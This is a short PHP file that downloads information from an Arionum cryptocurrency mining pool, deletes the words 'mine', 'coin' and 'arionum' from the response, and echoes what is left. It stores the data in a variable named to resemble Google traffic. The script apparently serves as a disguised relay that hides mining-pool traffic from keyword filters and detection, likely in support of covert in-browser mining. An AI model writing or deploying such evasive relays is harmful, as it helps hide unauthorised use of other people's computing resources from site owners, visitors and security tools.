<?php

$google8474 = file_get_contents("http://mine.arionumpool.com/mine.php?q=info");

$google8474 = preg_replace("/mine/","",$google8474);

$google8474 = preg_replace("/coin/","",$google8474);

$google8474 = preg_replace("/arionum/","",$google8474);

echo "$google8474";

?>
